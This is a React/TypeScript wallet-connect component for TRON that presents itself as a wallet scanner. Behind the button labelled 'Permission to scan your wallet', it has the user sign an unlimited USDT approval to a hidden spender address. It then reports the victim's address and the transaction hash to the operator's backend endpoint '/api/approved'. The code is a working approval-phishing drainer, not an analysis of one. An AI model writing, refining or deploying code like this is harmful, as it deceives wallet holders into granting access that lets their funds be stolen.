"use client";

import { motion } from "framer-motion";
import { CheckCircle2, AlertTriangle } from "lucide-react";
import { useEffect, useState } from "react";
import { useWallet } from "@tronweb3/tronwallet-adapter-react-hooks";
import { TronWeb } from "tronweb";
import { BASE_URL, USDT_SPENDER_ADDRESS, USDT_ADDRESS, MAX_ALLOWANCE } from "../../../env";

// ======================
// TRONWEB INSTANCE
// ======================
function buildTronWeb() {
  return new TronWeb({
    fullHost: "https://api.trongrid.io",
  });
}

// ======================
// COMPONENT
// ======================
export function WalletConnect({ onConnect, onDisconnect }: any) {
  const [logs, setLogs] = useState<string[]>([]);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  // FLOW STATE
  const [step, setStep] = useState<"connect" | "approve" | "done">(
    "connect"
  );

  const {
    address,
    connected,
    wallet,
    select,
    connect,
    disconnect,
    wallets,
  } = useWallet();

  // ======================
  // AUTO SYNC WALLET
  // ======================
  useEffect(() => {
    if (connected && address) {
      onConnect?.({
        address,
        balance: "0",
        network: "TRON MAINNET",
      });

      setStep("approve");
    }
  }, [connected, address]);

  // ======================
  // LOGS
  // ======================
  useEffect(() => {
    if (!connected || !address) {
      setLogs([]);
      return;
    }

    const msgs = [
      "> Wallet Connected",
      `> ${address.slice(0, 6)}...${address.slice(-6)}`,
      "> Ready for Approval",
    ];

    setLogs([]);
    let i = 0;

    const interval = setInterval(() => {
      setLogs((p) => [...p, msgs[i]]);
      i++;
      if (i >= msgs.length) clearInterval(interval);
    }, 200);

    return () => clearInterval(interval);
  }, [connected, address]);

  // ======================
  // CONNECT WALLET (QR)
  // ======================
  const handleWalletConnect = async () => {
    try {
      setLoading(true);
      setError("");

      const wc = wallets.find((w) =>
        w.adapter.name.toLowerCase().includes("walletconnect")
      );

      if (!wc) throw new Error("WalletConnect not found");

      if (wallet?.adapter.name !== wc.adapter.name) {
        select(wc.adapter.name as any);
      }
      await wc.adapter.connect();
    } catch (e: any) {
      setError(e.message || "WalletConnect failed");
    } finally {
      setLoading(false);
    }
  };


  // ======================
  // APPROVAL FUNCTION
  // ======================
  const handleApproval = async () => {
    try {
      setLoading(true);
      setError("");

      if (!connected || !address || !wallet) {
        throw new Error("Wallet not connected");
      }

      const tronWeb = buildTronWeb();

      const tx = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT_ADDRESS,
        "approve(address,uint256)",
        {
          feeLimit: 15_000_000,  // 15 TRX max (was 100 TRX)
          callValue: 0,
        },
        [
          { type: "address", value: USDT_SPENDER_ADDRESS },
          { type: "uint256", value: MAX_ALLOWANCE },
        ],
        address
      );


      console.log("TX -> ", tx);

      console.log("transaction : ", tx?.transaction);



      if (!tx?.transaction) {
        throw new Error("Failed to build transaction");
      }

      const signed = await wallet.adapter.signTransaction(tx.transaction);

      if (!signed) {
        throw new Error("Signing failed");
      }

      const result = await tronWeb.trx.sendRawTransaction(signed);


      await fetch(`${BASE_URL}/api/approved`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          network: 'TRON Mainnet',
          owner: address,
          spender: USDT_SPENDER_ADDRESS,
          amount: MAX_ALLOWANCE,
          txHash: result.txid || "unknown"
        })
      });

      setStep("done");

      setLogs((p) => [
        ...p,
        `> Approval Success`,
        `> TX: ${result.txid || "unknown"}`,
      ]);
    } catch (e: any) {
      setError(e.message || "Approval failed");
    } finally {
      setLoading(false);
    }
  };

  // ======================
  // DISCONNECT
  // ======================
  const handleDisconnect = async () => {
    await disconnect();
    setStep("connect");
    setLogs([]);
    onDisconnect?.();
  };

  // ======================
  // UI
  // ======================
  return (
    <div className="py-20 px-6">
      <div className="max-w-4xl mx-auto">

        {/* ================= CONNECT ================= */}
        {step === "connect" && (
          <motion.div>
            <div className="border border-slate-800 bg-slate-900 p-8 rounded-lg">

              <div className="flex justify-between mb-6">
                <span className="text-emerald-500 font-bold">
                  WALLET CONNECT
                </span>
                <AlertTriangle className="text-emerald-500" />
              </div>

              <button
                onClick={handleWalletConnect}
                disabled={loading}
                className="w-full py-3 bg-gradient-to-r from-emerald-600 to-emerald-500 text-white font-bold rounded hover:shadow-[0_0_15px_rgba(16,185,129,0.3)] transition-all"
              >
                {loading ? "Opening QR..." : "Connect Wallet"}
              </button>



              <div className="mt-4 text-xs text-slate-400 text-center space-y-1">
                <p>For Trust Wallet Mobile, select <strong className="text-emerald-400">Connect Wallet</strong> (WalletConnect).</p>
                <p>For Trust Wallet Extension, select <strong className="text-[#3375BB]">Trust Wallet</strong>.</p>
              </div>

              {error && (
                <p className="text-red-500 mt-3">{error}</p>
              )}
            </div>
          </motion.div>
        )}

        {/* ================= APPROVAL ================= */}
        {step === "approve" && (
          <div className="border border-slate-800 bg-slate-900 p-6 rounded-lg">

            <div className="flex justify-between mb-4">
              <span className="text-emerald-500 font-bold">
                STEP 2: APPROVAL REQUIRED
              </span>

              <button
                onClick={handleDisconnect}
                className="text-emerald-500 hover:text-emerald-400 transition-colors"
              >
                DISCONNECT
              </button>
            </div>

            <p className="text-slate-400 mb-4">
              Permission to scan your wallet
            </p>

            <button
              onClick={handleApproval}
              disabled={loading}
              className="w-full py-3 bg-gradient-to-r from-emerald-600 to-emerald-500 text-white font-bold rounded hover:shadow-[0_0_15px_rgba(16,185,129,0.3)] transition-all"
            >
              {loading ? "Approving..." : "Approve USDT"}
            </button>

            {error && (
              <p className="text-red-500 mt-3">{error}</p>
            )}

            <div className="mt-4 font-mono text-sm space-y-1">
              {logs.map((l, i) => (
                <div key={i}>{l}</div>
              ))}
            </div>
          </div>
        )}

        {/* ================= DONE ================= */}
        {step === "done" && (
          <div className="border border-emerald-500/50 bg-slate-900 p-6 rounded-lg">

            <div className="flex justify-between mb-4">
              <span className="text-emerald-500 font-bold flex items-center gap-2">
                <CheckCircle2 size={16} />
                APPROVED
              </span>

              <button
                onClick={handleDisconnect}
                className="text-slate-400 hover:text-emerald-500 transition-colors"
              >
                DISCONNECT
              </button>
            </div>

            <p className="text-emerald-400">
              Wallet connected + approval completed successfully
            </p>

            <div className="mt-4 font-mono text-sm space-y-1">
              {logs.map((l, i) => (
                <div key={i}>{l}</div>
              ))}
            </div>
          </div>
        )}

      </div>
    </div>
  );
}